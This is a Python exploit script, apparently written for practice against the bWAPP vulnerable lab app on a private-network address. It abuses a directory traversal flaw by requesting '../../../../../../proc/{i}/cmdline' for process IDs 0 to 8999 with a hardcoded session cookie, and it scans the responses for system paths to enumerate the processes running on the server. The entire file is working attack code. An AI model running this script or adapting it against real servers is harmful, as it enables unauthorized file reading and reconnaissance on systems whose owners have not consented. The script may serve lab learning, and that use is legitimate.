import requests
import re

def ExploitLFI(i):
    burp0_url = f"http://192.168.0.110:80/bWAPP/directory_traversal_1.php?page=../../../../../../proc/{i}/cmdline"
    burp0_cookies = {"PHPSESSID": "b1b1c129d8a5a6f8caa430286d4cd61a", "security_level": "0"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return r.text

def ParseHTML(htmlData):
    program = ''
    for line in htmlData.split("\n") :
        #print(line)
        if('/sbin' in line):
            print("FINALLY")
            program = line.replace("<br />", "")
            print(program)
            return program
        if('/usr' in line):
            print("FINALLY")
            program = line.replace("<br />", "")
            print(program)
            return program
        if('/etc' in line):
            print("FINALLY")
            program = line.replace("<br />", "")
            print(program)
            return program
    return None
    

def main():
    
    i = 0

    while i < 9000:
        
        htmlData = ExploitLFI(i)
        program = ParseHTML(htmlData)
        if(program != None):
            print(program)
    
        i = i+1


main()
